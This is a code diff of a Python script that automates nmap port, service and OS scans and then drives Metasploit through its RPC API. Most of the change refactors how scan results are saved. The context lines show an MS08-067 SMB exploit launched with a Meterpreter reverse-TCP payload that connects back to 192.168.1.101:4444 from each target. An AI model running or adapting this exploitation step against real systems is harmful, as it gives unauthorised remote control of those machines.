@@ -97,7 +97,11 @@ def scan_with_nmap(targets):
     nm = nmap.PortScanner()
     scan_arguments = '-sS -sV -O -p-'
     print(f"Scanning {targets} with arguments: {scan_arguments}")
-    nm.scan(hosts=','.join(targets), arguments=scan_arguments, callback=scan_callback)
+    for target in targets:
+        nm.scan(hosts=target, arguments=scan_arguments)
+        print(f"Completed scan of {target}")
+        # Save partial results after each host is scanned
+        save_to_json({target: nm[target]}, f"{target}_scan_results.json")
 
     results = {}
     for host in nm.all_hosts():
@@ -120,10 +124,6 @@ def scan_with_nmap(targets):
                 })
     return results
 
-def scan_callback(host, scan_result):
-    print(f"Scanning {host} completed.")
-    save_to_json(scan_result, f"{host}_partial_scan.json")
-
 def exploit_with_metasploit(api, target, lhost, lport):
     if not api.login():
         print("Failed to login to Metasploit")
@@ -135,7 +135,7 @@ def exploit_with_metasploit(api, target, lhost, lport):
         return
 
     console_id = console['id']
-    
+
     exploit = 'exploit/windows/smb/ms08_067_netapi'
     payload = 'windows/meterpreter/reverse_tcp'
     options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}
@@ -168,7 +168,7 @@ if tool_choice == 'nmap':
     # Get scan targets
     nmap_targets = get_targets_from_input()
     print("Nmap Scan Targets:", nmap_targets)
-    
+
     # Nmap scanning
     nmap_results = scan_with_nmap(nmap_targets)
     print("Nmap Scan Results:", nmap_results)
@@ -178,10 +178,10 @@ if tool_choice == 'nmap':
 elif tool_choice == 'metasploit':
     # Get scan targets
     targets = get_targets_from_input()
-    
+
     lhost = '192.168.1.101'
     lport = 4444
-    
+
     # Metasploit exploitation
     msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
     for target in targets:
